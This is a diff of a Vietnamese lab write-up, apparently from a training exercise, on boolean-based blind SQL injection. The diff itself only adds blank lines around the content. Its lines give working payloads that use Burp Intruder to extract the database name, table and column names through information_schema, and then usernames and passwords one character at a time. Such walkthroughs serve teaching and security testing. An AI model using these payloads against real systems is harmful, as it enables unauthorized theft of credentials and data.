@@ -164,6 +164,7 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
 ### Tìm tên database 
 
 * Tìm độ dài tên database
+
     **Payload:** `' OR length(database())= 1 -- ` 
 
     ![](https://i.imgur.com/8BUkiqn.png)
@@ -184,7 +185,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
     Vậy tên database chứa 4 ký tự.
     
 * Tìm tên database
+
     **Payload:** `' OR SUBSTRING(database(), 1, 1) = 'a' -- ` 
+
     Send to Intruder:
     
     ![](https://i.imgur.com/hh4Sq8G.png)
@@ -203,7 +206,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
     
 ### Tìm tên bảng
 * Tìm độ dài tên bảng
+
     Payload: `' or (select length(table_name) from information_schema.tables where table_schema='kcsc' limit 0,1)=1 -- `
+
     Send to Intruder:
     
     ![](https://i.imgur.com/HQK4nxx.png)
@@ -217,7 +222,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
     Tên bảng chứa 5 ký tự.
 
 * Tìm tên bảng
+
     Payload: `' or substring((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),1,1)='a' -- `
+
     Send to Intruder:
 
     ![](https://i.imgur.com/WqGw6cd.png)
@@ -234,7 +241,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
     
 ### Tìm tên cột
 * Tìm độ dài tên cột
+
     Payload: `' or (select length(column_name) from information_schema.columns where table_name='task7' limit 0,1)=1 -- `
+
     Send to Intruder: 
 
     ![](https://i.imgur.com/1CM2slO.png)
@@ -250,7 +259,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
     Bảng `task7` có 3 cột: độ dài của tên cột thứ nhất là 2, của hai cột còn lại là 8.
 
 * Tìm tên các cột
+
     Payload: `'or substring((select column_name from information_schema.columns where table_name='task7' limit 0,1),1,1)='a' -- `
+
     Send to Intruder:
 
     ![](https://i.imgur.com/IQjxVRz.png)
@@ -270,7 +281,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
 ### Lấy dữ liệu
 #### Lấy username
 * Tìm độ dài username 
+
     Payload: `' or (select length(username) from `task7` limit 0,1)=1 -- `
+
     Send to Intruder:
 
     ![](https://i.imgur.com/Q5WTCMb.png)
@@ -283,7 +296,9 @@ Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi t
 
 Username đầu tiên có 8 ký tự.
 * Tìm username
+
     Payload: `' or substring((select username from `task7`limit 0,1),1,1)='a' -- `
+
     Send to Intruder:
 
     ![](https://i.imgur.com/nIMJoJQ.png)
@@ -300,8 +315,11 @@ Username đầu tiên có 8 ký tự.
 
 #### Lấy password
 Tương tự như lấy `username`, em tìm password với các payload sau:
+
 * **Payload tìm độ dài password:** `' or (select length(password) from `task7` limit 0,1)=1 -- `
+
 * **Payload tìm password:** `' or substring((select password from `task7` limit 0,1),1,1)='a' -- `
+
 Kết quả:
 
 ![](https://i.imgur.com/vIzpByh.png)
